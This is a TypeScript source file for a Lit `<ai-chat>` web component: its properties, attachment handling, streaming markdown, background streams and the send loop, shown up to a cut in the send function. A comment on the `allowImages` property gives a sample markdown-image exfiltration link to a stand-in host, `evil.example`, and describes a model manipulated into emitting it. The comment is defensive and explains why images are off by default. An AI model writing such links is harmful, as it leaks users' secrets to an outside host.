import { LitElement, html, nothing, type PropertyValues } from 'lit';
import { customElement, property, state, query } from 'lit/decorators.js';
import { repeat } from 'lit/directives/repeat.js';
import { unsafeHTML } from 'lit/directives/unsafe-html.js';
import { classMap } from 'lit/directives/class-map.js';
import type {
  ChatMessage,
  ChatTransport,
  Role,
  Attachment,
} from './types.js';
import { renderMarkdown, StreamingMarkdown, type ImagePolicy } from './markdown/markdown.js';
import { chatStyles } from './styles.js';
import { hljsTheme } from './markdown/hljs-theme.js';
import { DEFAULT_LABELS, type ChatLabels } from './labels.js';
import {
  chevronDownIcon,
  sendIcon,
  newChatIcon,
  retryIcon,
  alertIcon,
  emptyChatIcon,
  attachIcon,
  closeIcon,
  fileIcon,
  copyIcon,
  editIcon,
} from './icons.js';

let idCounter = 0;
const nextId = () =>
  `msg-${Date.now().toString(36)}-${(idCounter++).toString(36)}`;

/**
 * `<ai-chat>` — a reusable, themeable chat interface.
 *
 * Set a transport (built-in adapter or your own) via the `.transport` property.
 * Theme it with CSS custom properties (see styles.ts). Listen for the
 * `message` and `error` events, or drive it programmatically.
 *
 * @fires ai-chat:message   { message: ChatMessage }     after each completed turn
 *                          (message carries `finishReason` / `usage` when the
 *                          transport reported them)
 * @fires ai-chat:error     { error: string }            on transport failure
 * @fires ai-chat:submit    { content: string }          when the user sends
 * @fires ai-chat:new-chat  { messages: ChatMessage[] }  when New-chat is clicked
 *                          (cancelable: preventDefault to keep the conversation)
 * @fires ai-chat:message-edit { index, message, newContent }  when a user
 *                          confirms an edit (show-edit). Cancelable — the
 *                          component does NOT mutate messages; the consumer owns
 *                          what edit means (truncate-after + resend, etc.).
 */
/**
 * Boolean attributes as the docs describe them: absent or `"false"` is off;
 * present, `""` or `"true"` is on. Lit's stock converter treats ANY present
 * attribute as true, so `show-timestamps="false"` — the natural way to write it
 * in an Angular or Vue template — used to switch the feature ON. Reflection is
 * unchanged: true writes a bare attribute, false removes it.
 */
const booleanAttribute = {
  fromAttribute: (value: string | null): boolean => value !== null && value.trim().toLowerCase() !== 'false',
  toAttribute: (value: boolean): string | null => (value ? '' : null),
};

@customElement('ai-chat')
export class AiChat extends LitElement {
  static override styles = [chatStyles, hljsTheme];

  /** The transport used to send messages. Required to actually chat. */
  @property({ attribute: false })
  transport?: ChatTransport;

  /**
   * Color theme. `'auto'` (default) follows the OS light/dark preference;
   * `'light'` and `'dark'` force that mode. Reflected so the CSS selectors
   * (`:host([theme='dark'])`) can react to it. Usage: `<ai-chat theme="dark">`.
   */
  @property({ type: String, reflect: true })
  theme: 'auto' | 'light' | 'dark' = 'auto';

  /** Optional system prompt prepended to every request (not shown in the UI). */
  @property({ type: String, attribute: 'system-prompt' })
  systemPrompt = '';

  /** Placeholder text for the input box. */
  @property({ type: String })
  placeholder = 'Send a message…';

  /**
   * Override any subset of the UI/accessibility strings. Unspecified keys keep
   * their defaults. This is the single hook for i18n / translation.
   * @example chat.labels = { emptyHeading: 'Bonjour', send: 'Envoyer' };
   */
  @property({ attribute: false })
  labels: Partial<ChatLabels> = {};

  /** Convenience attribute mirroring `labels.emptyHeading`. */
  @property({ type: String, attribute: 'empty-heading' })
  emptyHeading?: string;

  /** Convenience attribute mirroring `labels.emptyBody`. */
  @property({ type: String, attribute: 'empty-body' })
  emptyBody?: string;

  /** Merged labels: defaults ← `labels` object ← convenience attributes. */
  private get _labels(): ChatLabels {
    const merged: ChatLabels = { ...DEFAULT_LABELS, ...this.labels };
    if (this.emptyHeading != null) merged.emptyHeading = this.emptyHeading;
    if (this.emptyBody != null) merged.emptyBody = this.emptyBody;
    return merged;
  }

  /**
   * By default assistant messages render as borderless plain text (ChatGPT/
   * Claude style). Set this to wrap them in a bubble like the user's messages.
   * Reflected so the CSS (`:host([assistant-bubble])`) can react. Default: false.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'assistant-bubble', reflect: true })
  assistantBubble = false;

  /**
   * Show the built-in header bar (title + New-chat button). Off by default so
   * the widget stays chrome-free. Provide a `header` slot to replace the whole
   * bar with your own markup — the slot wins whether or not this is set.
   * Reflected so CSS (`:host([show-header])`) can react. Default: false.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-header', reflect: true })
  showHeader = false;

  /**
   * Show the built-in New/Clear-chat button (inside the header when
   * `show-header` is on, otherwise floating top-right). Calls `clear()`.
   * Default: false.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-clear' })
  showClear = false;

  /**
   * Show a Retry button on a message that failed, which re-sends the last user
   * turn. Default: true — it's the expected behavior and costs nothing when
   * there are no errors.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-retry' })
  showRetry = true;

  /**
   * Show a built-in copy button in the per-message actions row (both roles).
   * On by default. Set `show-copy="false"` to hide it; the row still renders
   * for any consumer actions slotted via `message-actions-start` / `-end`.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-copy' })
  showCopy = true;

  /**
   * Show a built-in edit button on USER messages only. Off by default. When the
   * user confirms an edit the component fires a cancelable `ai-chat:message-edit`
   * event `{ index, message, newContent }` — the CONSUMER owns what "edit" means
   * (truncate-after + resend, edit-in-place, branch, ...). The component does not
   * mutate `.messages` itself. No-op on assistant messages.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-edit' })
  showEdit = false;

  /**
   * Identifies the conversation currently displayed. Purely a tag the component
   * hands back to you: set it to your own storage key whenever you swap
   * `.messages`, and any reply still streaming for the conversation you left
   * arrives on `ai-chat:background-message` carrying the id it started under, so
   * you know which conversation to persist it to. Optional — `null` when unset.
   */
  @property({ type: String, attribute: 'conversation-id' })
  conversationId: string | null = null;

  /**
   * Abort an in-flight reply when the conversation is switched or cleared,
   * instead of letting it finish in the background. Off by default: like every
   * real chat app, switching away from a generating conversation lets it keep
   * generating (see `ai-chat:background-message`). Turn this on to get the
   * pre-0.4.0 behavior back — the request is cancelled the moment you leave.
   *
   * Note this only governs the IMPLICIT orphaning of a stream. An explicit
   * `stop()` (the Stop button, or Esc) always aborts, because that's the user
   * saying they don't want the reply at all.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'abort-on-switch' })
  abortOnSwitch = false;

  /**
   * Show the optional sidebar column (for a conversation-history list). Off by
   * default — when off, the column isn't rendered and a plain chat is entirely
   * unaffected. Fill it via the `aside` slot; drive it with the `ai-chat:new-chat`
   * event and by swapping `.messages`. Reflected for CSS. Default: false.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-aside', reflect: true })
  showAside = false;

  /**
   * Which side the sidebar sits on. Left by default (ChatGPT/Claude style).
   * Reflected so the CSS can flip the layout order. Usage: `aside-side="right"`.
   */
  @property({ type: String, attribute: 'aside-side', reflect: true })
  asideSide: 'left' | 'right' = 'left';

  /** Show the sender name above each message bubble. Default: true. */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-names' })
  showNames = true;

  /** Show a timestamp (e.g. "3:45 PM") next to each message. Default: true. */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-timestamps' })
  showTimestamps = true;

  /** Disable the whole input surface. */
  @property({ type: Boolean, converter: booleanAttribute })
  disabled = false;

  /**
   * Enable file/image attachments: shows the built-in attach button in the
   * composer and lets the user drag-drop or paste files. Off by default — a chat
   * without it behaves exactly as before. Only image attachments are sent to the
   * built-in adapters; other files still reach the consumer via `ai-chat:submit`.
   * Reflected so CSS (`:host([allow-attachments])`) can react. Default: false.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'allow-attachments', reflect: true })
  allowAttachments = false;

  /**
   * Hide the built-in attach button while keeping the rest of the attachment
   * capability — paste, drag-drop, and the imperative `openFilePicker()` all
   * still work. Use this when you want paste/drop without a visible button, or
   * you're providing your own trigger via `composer-actions-start`. Only
   * meaningful with `allow-attachments`. Default: false.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'hide-attach-button' })
  hideAttachButton = false;

  /**
   * Which file types the picker/drop/paste accepts, in the standard `accept`
   * form (`image/*`, `.pdf`, `image/png,application/pdf`, `*`). Default:
   * `image/*`. The UI accepts whatever you allow here; note only images auto-send
   * to the AI (see `allow-attachments`).
   */
  @property({ type: String })
  accept = 'image/*';

  /** Max number of attachments per message. Default: 5. */
  @property({ type: Number, attribute: 'max-attachments' })
  maxAttachments = 5;

  /**
   * Max size (bytes) for a single attachment. `0` (default) means no cap — the
   * consumer decides. A file over the cap is rejected via `ai-chat:attach-rejected`.
   */
  @property({ type: Number, attribute: 'max-attachment-size' })
  maxAttachmentSize = 0;

  /**
   * Render images inside replies. Off by default: a reply is model output, and
   * an image tag makes the reader's browser fetch its URL the moment it shows —
   * a model talked into writing `![](https://evil.example/?d=<secret>)` would
   * send the secret out (markdown image exfiltration). Off, an image renders as
   * its alt text. Turn on only when replies need pictures, and pair it with
   * `image-hosts`. Usage: `<ai-chat allow-images image-hosts="https://cdn.example.com/">`.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'allow-images' })
  allowImages = false;

  /**
   * With `allow-images`, the URL prefixes images may load from — space-separated
   * in the attribute, an array as a property. Only `https:` URLs ever load.
   * Empty (default) allows any `https:` image.
   */
  @property({
    attribute: 'image-hosts',
    converter: {
      fromAttribute: (value: string | null) => (value ?? '').split(/\s+/).filter(Boolean),
      toAttribute: (value: readonly string[]) => value.join(' '),
    },
  })
  imageHosts: readonly string[] = [];

  /**
   * An image URL for the assistant's avatar on every reply — the simple way to
   * set one. Wins over an `assistant-avatar` slot. A slot is CLONED into each
   * message inside the shadow DOM, so a framework component styled by page CSS
   * renders blank there; a URL never has that problem.
   */
  @property({ type: String, attribute: 'assistant-avatar-src' })
  assistantAvatarSrc = '';

  /** An image URL for the user's avatar on every user message. Wins over a `user-avatar` slot. */
  @property({ type: String, attribute: 'user-avatar-src' })
  userAvatarSrc = '';

  /**
   * There are older messages than the ones in `.messages`. Shows a "Load
   * earlier messages" control at the top of the list; asking for them fires
   * `ai-chat:load-earlier`, and you answer with `prependMessages(older)`. The
   * component never fetches anything — you own the storage and the paging.
   * Usage: `<ai-chat has-earlier>`; clear it once the oldest message is shown.
   */
  @property({ type: Boolean, converter: booleanAttribute, attribute: 'has-earlier' })
  hasEarlier = false;

  /**
   * How older messages are asked for when `has-earlier` is set: `'scroll'`
   * (default) loads as the reader nears the top, with the button as well for
   * keyboard and screen-reader users; `'button'` loads only on a click.
   */
  @property({ type: String, attribute: 'load-earlier' })
  loadEarlier: 'scroll' | 'button' = 'scroll';

  /** The conversation. Bindable and reflected back out via events. */
  @property({ attribute: false })
  messages: ChatMessage[] = [];

  @state() private _busy = false;
  @state() private _input = '';
  /** Attachments staged in the composer, not yet sent. */
  @state() private _pending: Attachment[] = [];
  /** True while a file is being dragged over the composer (drop-zone styling). */
  @state() private _dragging = false;
  /** Shown when the user has scrolled up away from the latest message. */
  @state() private _showJump = false;
  /** The missing-transport warning has been printed for this element. */
  private _warnedNoTransport = false;
  /** An `ai-chat:load-earlier` is out and its answer hasn't come back yet. */
  @state() private _loadingEarlier = false;
  /** The image attachment shown in the full-size preview overlay (null = none). */
  @state() private _preview: Attachment | null = null;
  /** id of the user message currently being edited inline (null = none). */
  @state() private _editingId: string | null = null;
  /** Live text of the in-progress edit, mirrored from the inline textarea. */
  @state() private _editDraft = '';
  /**
   * Text pushed to a visually-hidden aria-live region so screen readers hear the
   * assistant's reply ONCE, when it settles — not token-by-token. The message
   * list itself is a `role="log"` WITHOUT aria-live: a polite live region
   * re-announces on every mutation, so streaming deltas would spam a growing
   * partial message on each token. See `_announce()` / `_renderLiveRegion()`.
   */
  @state() private _announcement = '';

  private _abort?: AbortController;

  /**
   * Replies that are still generating for a conversation that isn't on screen
   * (the consumer switched conversations or hit New-chat mid-reply). Keyed by
   * the `conversationId` that was active when the turn was SENT.
   *
   * The component still owns only ONE visible conversation — the consumer owns
   * history and storage, as always. This map is the narrow exception: a stream
   * outlives the view it started in, so we hold its live message here until it
   * settles. That's what lets a switch BACK to that conversation resume
   * rendering it, tokens still arriving, instead of showing a frozen snapshot.
   *
   * A detached stream can't write through `_patch` (its message object is no
   * longer in the visible array, so the map would silently no-op and the tokens
   * would evaporate); the send loop updates `message` here instead, and
   * `_syncDetachedIntoView` mirrors it into `this.messages` whenever the matching
   * conversation is the one being displayed.
   *
   * We keep the controllers so `disconnectedCallback` can abort them: a removed
   * element must not leave requests running.
   */
  private _detached = new Map<
    string,
    { controller: AbortController; message: ChatMessage }
  >();

  /**
   * Bumped whenever a detached stream produces a token, purely to trigger a
   * re-render while we're viewing that conversation. The message content itself
   * lives in `_detached`; `messages` is only rewritten when the stream is
   * actually visible (see `_syncDetachedIntoView`).
   */
  @state() private _detachedVersion = 0;

  /**
   * Detached streams from a conversation with no `conversation-id` set. They
   * can't be switched back to (nothing identifies them), so they just run to
   * completion and report via the event — but we still hold their controllers
   * so disconnect can abort them.
   */
  private _untagged = new Set<AbortController>();

  /**
   * Detaches the CURRENT send, if one is running. Set by `send()` for the
   * lifetime of its stream so a conversation switch can push it to the
   * background immediately (see `willUpdate`). Undefined when nothing is
   * streaming, or once the stream has already detached.
   */
  private _detachActive?: () => void;

  /**
   * Mirror a still-generating background reply into the visible conversation,
   * but ONLY when the conversation it belongs to is the one on screen. This is
   * what makes switching back to a generating chat show it still streaming
   * rather than frozen at the moment you left.
   *
   * Appends the message if the view doesn't have it yet (the usual case right
   * after a switch), otherwise updates it in place.
   */
  private _syncDetachedIntoView(
    conversationId: string | null,
    message: ChatMessage,
  ): void {
    if (conversationId == null || conversationId !== this.conversationId) return;
    const i = this.messages.findIndex((m) => m.id === message.id);
    if (i === -1) {
      this.messages = [...this.messages, message];
    } else {
      this.messages = this.messages.map((m) => (m.id === message.id ? message : m));
    }
    this._detachedVersion++;
  }

  /**
   * Called after the consumer swaps `.messages` / `conversationId`. If the
   * conversation now on screen has a reply still generating, put it back in the
   * list so it keeps painting live. The consumer's stored copy of that
   * conversation is a snapshot from when they left, so it either lacks the
   * streaming turn entirely or holds a stale, partial version — both are fixed
   * by re-mirroring the live message.
   */
  private _resumeDetachedForView(): void {
    if (this.conversationId == null) return;
    const entry = this._detached.get(this.conversationId);
    if (!entry) return;
    this._syncDetachedIntoView(this.conversationId, entry.message);
    // The composer must show Stop again: this conversation IS generating, and
    // the user needs to be able to interrupt it now that they're looking at it.
    this._abort = entry.controller;
    this._busy = true;
  }

  /** True when the given conversation has a reply generating in the background. */
  isGenerating(conversationId: string): boolean {
    return this._detached.has(conversationId);
  }
  /**
   * While true, new content keeps the view pinned to the bottom. Driven by an
   * IntersectionObserver watching a sentinel element at the very bottom of the
   * list: sticky === "the bottom sentinel is currently visible". This is far
   * more robust than scrollTop/scrollHeight math (no jitter, no sub-pixel or
   * zoom edge cases) and is how ChatGPT/Claude-style chats avoid fighting the
   * user's scroll during streaming.
   */
  private _stickToBottom = true;
  private _bottomObserver?: IntersectionObserver;

  @query('.messages') private _scrollEl!: HTMLElement;
  @query('.scroll-sentinel') private _sentinel!: HTMLElement;
  @query('.top-sentinel') private _topSentinel?: HTMLElement;
  @query('.earlier__button') private _earlierButton?: HTMLButtonElement;
  /** Watches the top of the list so older messages load as the reader nears it. */
  private _topObserver?: IntersectionObserver;
  private _observedTop?: Element;
  /** The first message when older ones were asked for; a different one means the conversation changed. */
  private _earlierAnchor?: ChatMessage;
  private _prepending = false;
  @query('textarea') private _textarea!: HTMLTextAreaElement;
  @query('.composer__file') private _fileInput?: HTMLInputElement;

  /** Monotonic counter so pasted images get stable, distinct names. */
  private _pasteCount = 0;

  /**
   * Incremental markdown renderers, one per message that is CURRENTLY
   * streaming. Re-parsing a whole message on every token made long replies
   * choppy (cost grew with length — ~79ms/token at 58KB); the incremental
   * renderer keeps per-token cost flat (~2ms worst case) by freezing completed
   * blocks. Entries are dropped the first time the message renders as settled,
   * at which point one final full `renderMarkdown` becomes the authoritative
   * output (the two are DOM-equivalent — enforced by
   * test/streaming-markdown.test.ts — so nothing visibly changes on settle).
   */
  private _streamRenderers = new Map<string, StreamingMarkdown>();

  /**
   * The markdown body for one assistant message.
   *
   * While the message STREAMS it renders as two sibling nodes — the frozen
   * head (only changes when a block completes) and the live tail (changes per
   * token). Two nodes matter as much as the incremental parse: one container
   * means one big innerHTML swap per token, whose DOM cost grows with the
   * message (measured ~36ms max on a 29KB reply even with cached parsing).
   * The wrappers are `display: contents`, so block flow, margins, and margin
   * collapsing behave exactly as if every block were a direct child.
   *
   * Settled messages take the plain single-render path, untouched.
   */
  private _renderMarkdown(m: ChatMessage) {
    if (m.streaming) {
      let r = this._streamRenderers.get(m.id);
      if (!r) {
        r = new StreamingMarkdown(this._labels.copy, this._imagePolicy);
        this._streamRenderers.set(m.id, r);
      }
      const { blocks, tail } = r.renderParts(m.content);
      // Each frozen block is its own node. The blocks array is append-only and
      // Lit reconciles children by index, so on a typical token every existing
      // block's unsafeHTML sees an unchanged string and does nothing — only the
      // small tail (and at most one newly completed block) touches the DOM.
      return html`<div class="markdown">
        ${blocks.map((b) => html`<div class="markdown__part">${unsafeHTML(b)}</div>`)}
        ${tail ? html`<div class="markdown__part">${unsafeHTML(tail)}</div>` : nothing}
      </div>`;
    }
    // Settled: render fully once and let the incremental state go. The map
    // stays tiny — it only ever holds messages that are streaming right now.
    this._streamRenderers.delete(m.id);
    return html`<div class="markdown">${unsafeHTML(renderMarkdown(m.content, this._labels.copy, this._imagePolicy))}</div>`;
  }

  private get _imagePolicy(): ImagePolicy {
    return { allowImages: this.allowImages, imageHosts: this.imageHosts };
  }

  /**
   * Every `ai-chat:*` event is also fired as `ai-chat-*` (dash instead of
   * colon), same detail. Angular reads `(ai-chat:message)` as a global target
   * like `window:resize` and refuses to compile it; `(ai-chat-message)` binds in
   * any framework's template. Cancelling either name cancels both.
   */
  override dispatchEvent(event: Event): boolean {
    const allowed = super.dispatchEvent(event);
    if (!(event instanceof CustomEvent) || !event.type.startsWith('ai-chat:')) return allowed;
    const alias = new CustomEvent(event.type.replace('ai-chat:', 'ai-chat-'), {
      detail: event.detail,
      bubbles: event.bubbles,
      composed: event.composed,
      cancelable: event.cancelable,
    });
    const aliasAllowed = super.dispatchEvent(alias);
    // Callers read `event.defaultPrevented` after dispatch; a cancel on the
    // alias must show there too.
    if (!aliasAllowed && event.cancelable) event.preventDefault();
    return allowed && aliasAllowed;
  }

  /** Programmatically append a message without sending it. */
  addMessage(role: Role, content: string): ChatMessage {
    const msg: ChatMessage = {
      id: nextId(),
      role,
      content,
      createdAt: Date.now(),
    };
    this.messages = [...this.messages, msg];
    return msg;
  }

  /**
   * Add older messages ABOVE the conversation — your answer to
   * `ai-chat:load-earlier`. What the reader is looking at stays exactly where
   * it is on screen; the new messages appear above it. Call it with `[]` if
   * nothing came back (or the load failed) so the control is usable again, and
   * clear `has-earlier` once you've reached the first message.
   */
  async prependMessages(older: ChatMessage[]): Promise<void> {
    const el = this._scrollEl;
    // Distance from the bottom is what must not change: everything the reader
    // sees sits below the inserted messages.
    const fromBottom = el ? el.scrollHeight - el.scrollTop : 0;
    const hadFocus = this.shadowRoot?.activeElement === this._earlierButton;
    this._loadingEarlier = false;
    this._earlierAnchor = undefined;
    if (older.length > 0) {
      this._prepending = true;
      this.messages = [...older, ...this.messages];
    }
    await this.updateComplete;
    this._prepending = false;
    // Restore the distance from the bottom whatever the pin state says: a reader
    // at the bottom stays at the bottom, and one reading back keeps their place.
    // (The pin flag can lag a fast scroll by a frame, so it can't decide this.)
    if (el && older.length > 0) {
      el.scrollTop = el.scrollHeight - fromBottom;
      // Our own scroll must not read as the user scrolling (see _onScroll).
      this._lastScrollTop = el.scrollTop;
      this._lastScrollHeight = el.scrollHeight;
    }
    // The button can go (no more history) while it holds focus; don't drop
    // keyboard users onto <body>.
    if (hadFocus && !this._earlierButton) this._focusComposer();
    this._recheckTop();
  }

  /**
   * Clear the conversation and start a fresh one. Also clears any half-typed
   * draft in the composer so a new chat starts truly empty.
   *
   * An in-flight reply is NOT cancelled: it keeps generating in the background
   * and settles on `ai-chat:background-message` so you can persist it to the
   * conversation it belongs to. Set `abort-on-switch` to cancel it instead.
   */
  clear(): void {
    const hadFocus = this._focusIsInside();
    const wasStreaming = this._busy && this.messages.some((m) => m.streaming);
    if (this.abortOnSwitch) {
      this.stop();
    } else {
      // Detach the running reply BEFORE we drop the id below, so it's filed
      // under the conversation it actually belongs to and can be returned to.
      if (wasStreaming) this._detachActive?.();
      this._busy = false;
      this._abort = undefined;
      // A NEW chat is a different conversation, so it must not keep the outgoing
      // one's id — otherwise the reply we're detaching would be re-adopted on the
      // next render and start painting into the empty chat. The consumer normally
      // assigns their own id on `ai-chat:new-chat`; this is the right default
      // until they do. (`wasStreaming` because the stream detaches lazily on its
      // next chunk, so `_detached` usually isn't populated yet at this point.)
      if (wasStreaming) this.conversationId = null;
    }
    this.messages = [];
    this._input = '';
    this._pending = [];
    // A fresh chat starts pinned to the bottom with no jump button. Without this,
    // clearing while scrolled up leaves the jump arrow stuck (the empty chat has
    // nothing to scroll, so clicking it does nothing and the observer never
    // re-fires to hide it). Reset the scroll-follow state explicitly.
    this._stickToBottom = true;
    this._showJump = false;
    if (this._textarea) {
      this._textarea.style.height = 'auto';
      this._textarea.style.overflowY = 'hidden';
    }
    // The New-chat button that triggered this may have just been removed from
    // the DOM (it lives in the header/sidebar); if focus was in the widget, move
    // it to the composer so keyboard users aren't dropped onto <body>.
    if (hadFocus) this._focusComposer();
  }

  /**
   * True when keyboard focus currently sits inside this widget — either on a
   * control in our shadow DOM, or on the host itself. Used to decide whether an
   * action that removes the focused element (retry, stop, clear) should relocate
   * focus: we only do so when we actually own focus, never yanking it from
   * elsewhere on the page when a consumer calls these methods programmatically.
   */
  private _focusIsInside(): boolean {
    return (
      this.shadowRoot?.activeElement != null ||
      document.activeElement === this
    );
  }

  /** Move focus to the composer input (the natural resting place after an
   *  action removes the previously focused control). No-op when disabled. */
  private _focusComposer(): void {
    if (this.disabled) return;
    // Wait for the render that removes the old control / shows the new composer
    // state so the textarea exists and is focusable when we call focus().
    void this.updateComplete.then(() => this._textarea?.focus());
  }

  /**
   * Re-send the most recent user turn. Drops the trailing failed/empty
   * assistant message (if any) and streams a fresh reply. Used by the built-in
   * Retry button, but also callable programmatically. No-op while busy or when
   * there's no user turn to retry.
   */
  async retry(): Promise<boolean> {
    if (this._busy) return false;
    // Find the last user message; everything after it (a failed assistant turn)
    // is discarded before we resend.
    let lastUser = -1;
    for (let i = this.messages.length - 1; i >= 0; i--) {
      if (this.messages[i].role === 'user') {
        lastUser = i;
        break;
      }
    }
    if (lastUser === -1) return false;
    // The Retry button that triggered this is inside the failed message we're
    // about to remove; if focus was on it, relocate to the composer so it isn't
    // dropped onto <body> when the message is discarded.
    const hadFocus = this._focusIsInside();
    const content = this.messages[lastUser].content;
    this.messages = this.messages.slice(0, lastUser);
    if (hadFocus) this._focusComposer();
    return this.send(content);
  }

  /** Cancel any in-flight generation. */
  stop(): void {
    // The Stop button is about to be replaced by the Send button; if focus was
    // on it, move it to the composer so keyboard users keep their place.
    const hadFocus = this._focusIsInside();
    // If we're viewing a conversation whose reply was generating in the
    // background, stopping it must also drop it from the detached registry —
    // otherwise it would look "still generating" and get resumed on the next
    // switch back, despite the user having explicitly stopped it.
    if (this.conversationId != null) {
      const entry = this._detached.get(this.conversationId);
      if (entry) {
        entry.controller.abort();
        this._detached.delete(this.conversationId);
      }
    }
    this._abort?.abort();
    this._abort = undefined;
    this._busy = false;
    this.messages = this.messages.map((m) =>
      m.streaming ? { ...m, streaming: false } : m,
    );
    if (hadFocus) this._focusComposer();
  }

  /**
   * Send a message programmatically (same path as the send button).
   * Returns `false` without sending when the text is empty, a generation is
   * already in flight, or no transport is configured.
   */
  async send(content: string, attachments?: Attachment[]): Promise<boolean> {
    const text = content.trim();
    const atts = attachments ?? [];
    // A turn is valid with text OR at least one attachment (an image with no
    // caption is a real message). Only the empty-and-attachment-less case bails.
    if ((!text && atts.length === 0) || this._busy) return false;
    if (!this.transport) {
      const message = 'No transport configured. Set the `.transport` property.';
      // The error event alone was invisible: an app that doesn't listen saw a
      // send button do nothing at all. Say it in the console once per element.
      if (!this._warnedNoTransport) {
        this._warnedNoTransport = true;
        console.warn(`<ai-chat>: ${message} Nothing was sent. See the README's "Transports" section.`);
      }
      this._emitError(message);
      return false;
    }

    // Sending always snaps the user back to the latest turn.
    this._stickToBottom = true;
    this._showJump = false;
    const userMsg: ChatMessage = {
      id: nextId(),
      role: 'user',
      content: text,
      createdAt: Date.now(),
      ...(atts.length ? { attachments: atts } : {}),
    };
    this.messages = [...this.messages, userMsg];
    this.dispatchEvent(
      new CustomEvent('ai-chat:submit', {
        detail: { content: text, attachments: atts },
        bubbles: true,
        composed: true,
      }),
    );

    const assistant: ChatMessage = {
      id: nextId(),
      role: 'assistant',
      content: '',
      createdAt: Date.now(),
      streaming: true,
    };
    this.messages = [...this.messages, assistant];

    this._busy = true;
    // Each send owns its own controller. We keep a local reference so the
    // cleanup below can tell whether THIS stream is still the current one — if
    // the user started a new chat / new send mid-stream, a newer controller has
    // replaced ours in `this._abort`, and our late-arriving cleanup must not
    // clobber it (that would orphan the new stream and make it unstoppable).
    const controller = new AbortController();
    this._abort = controller;
    const signal = controller.signal;
    // The conversation this reply belongs to, captured at send time. If the
    // consumer switches conversations mid-stream this is what tells them which
    // one the finished reply should be saved under.
    const conversationId = this.conversationId;
    // Our running copy of the assistant turn. While the message is on screen
    // this mirrors what's in `this.messages`; once detached it becomes the only
    // copy, since the visible array no longer holds it.
    let working: ChatMessage = assistant;
    let detached = false;

    /**
     * Has our message been swapped out from under us? That happens when the
     * consumer assigns a new `.messages` array (conversation switch) or calls
     * `clear()` — in both cases the object we're growing is simply gone.
     */
    const isOrphaned = () => !this.messages.some((m) => m.id === assistant.id);

    /** Move this stream to the background: stop writing straight into the
     *  visible list and hand the composer's busy state back. The request keeps
     *  running, and the message stays live in `_detached` so switching back to
     *  this conversation resumes rendering it.
     *
     *  Registered on the element so a conversation switch can detach us EAGERLY
     *  (see `willUpdate`). Waiting for our next chunk isn't good enough: a
     *  stream that goes quiet right as the user switches would never register,
     *  and switching back would find nothing to resume. */
    const detach = () => {
      detached = true;
      // Keyed by conversation, not message id: that's what a switch back is
      // matched on. An untagged conversation (no `conversation-id` set) can't be
      // returned to, so it streams to completion purely via the event.
      if (conversationId != null) {
        this._detached.set(conversationId, { controller, message: working });
      } else {
        this._untagged.add(controller);
      }
      // We no longer own the composer's busy state — the visible conversation
      // is idle even though this request is still running. Guarded so we don't
      // clobber a NEWER send that already took over.
      if (this._abort === controller) {
        this._abort = undefined;
        this._busy = false;
      }
      this._detachActive = undefined;
    };
    // Expose it so a `.messages` / `conversationId` swap can detach us the
    // moment it happens, rather than whenever the next token shows up.
    this._detachActive = () => {
      if (!detached) detach();
    };

    /** Apply a change to the assistant turn, wherever it currently lives. */
    const update = (fn: (m: ChatMessage) => ChatMessage) => {
      working = fn(working);
      if (!detached) {
        this._patch(assistant.id, fn);
        return;
      }
      // Keep the detached record current, then mirror it into the visible list
      // if the user is looking at this conversation right now.
      if (conversationId != null) {
        const entry = this._detached.get(conversationId);
        if (entry) entry.message = working;
      }
      this._syncDetachedIntoView(conversationId, working);
    };

    const emitBackground = (done: boolean) => {
      this.dispatchEvent(
        new CustomEvent('ai-chat:background-message', {
          detail: { conversationId, message: working, done },
          bubbles: true,
          composed: true,
        }),
      );
    };

    const outbound: ChatMessage[] = this.systemPrompt
      ? [
          {
            id: 'system',
            role: 'system',
            content: this.systemPrompt,
            createdAt: 0,
          },
          ...this.messages.filter((m) => m.id !== assistant.id),
        ]
      : this.messages.filter((m) => m.id !== assistant.id);

    try {
      for await (const chunk of this.transport.send(outbound, signal)) {
        if (signal.aborted) break;
        // Detect an orphaning as soon as it happens. Unless the consumer opted
        // into `abort-on-switch`, the request keeps running and simply changes
        // where its output goes.
        if (!detached && isOrphaned()) {
          if (this.abortOnSwitch) break;
          detach();
        }
        if (chunk.type === 'delta') {
          update((m) => ({ ...m, content: m.content + chunk.delta }));
          if (detached) emitBackground(false);
        } else if (chunk.type === 'error') {
          update((m) => ({ ...m, streaming: false, error: chunk.error }));
          this._emitError(chunk.error);
          break;
        } else if (chunk.type === 'done') {
          // Stash any stop-reason / token-usage metadata onto the settled
          // message so it flows out on `ai-chat:message`. Only patch fields the
          // transport actually reported.
          if (chunk.finishReason || chunk.usage) {
            update((m) => ({
              ...m,
              ...(chunk.finishReason
                ? { finishReason: chunk.finishReason }
                : {}),
              ...(chunk.usage ? { usage: chunk.usage } : {}),
            }));
          }
          break;
        }
      }
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      if (!signal.aborted) {
        // The stream may have been orphaned before it blew up; a background
        // failure still has to reach the consumer, so route it the same way.
        if (!detached && isOrphaned() && !this.abortOnSwitch) detach();
        update((m) => ({ ...m, streaming: false, error: message }));
        if (!detached) this._emitError(message);
      }
    } finally {
      // A stream that ended while detached settles entirely through the event —
      // it must not touch the visible conversation, announce to the live region,
      // or fire `ai-chat:message` (that would look to the consumer like a reply
      // in the conversation they're currently LOOKING at).
      if (detached) {
        if (conversationId != null) this._detached.delete(conversationId);
        this._untagged.delete(controller);
        // A message that settles in the background never renders as settled,
        // so its incremental renderer would otherwise linger in the map.
        this._streamRenderers.delete(assistant.id);
        if (!signal.aborted) {
          working = { ...working, streaming: false };
          // Land the finished reply in the view if the user is looking at this
          // conversation (they switched back mid-stream and watched it finish),
          // and release the composer, which we re-claimed on their return.
          if (conversationId != null && conversationId === this.conversationId) {
            this._syncDetachedIntoView(conversationId, working);
            if (this._abort === controller) {
              this._abort = undefined;
              this._busy = false;
            }
          }
